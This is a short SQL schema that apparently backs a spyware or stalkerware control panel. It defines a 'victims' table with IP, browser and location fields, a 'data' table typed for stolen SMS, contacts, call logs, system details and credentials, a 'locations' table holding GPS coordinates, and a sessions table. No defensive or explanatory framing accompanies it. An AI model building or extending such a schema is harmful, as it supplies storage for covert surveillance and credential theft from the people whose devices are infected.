CREATE TABLE IF NOT EXISTS victims (
    id VARCHAR(50) PRIMARY KEY,
    ip VARCHAR(45),
    user_agent TEXT,
    os VARCHAR(50),
    browser VARCHAR(50),
    country VARCHAR(100),
    city VARCHAR(100),
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP,
    data_count INT DEFAULT 0
);

CREATE TABLE IF NOT EXISTS data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    victim_id VARCHAR(50),
    type ENUM('sms','contacts','calls','location','system','credentials'),
    content TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS locations (
    id INT AUTO_INCREMENT PRIMARY KEY,
    victim_id VARCHAR(50),
    lat DECIMAL(10,8),
    lng DECIMAL(11,8),
    accuracy FLOAT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS sessions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    victim_id VARCHAR(50),
    session_id VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
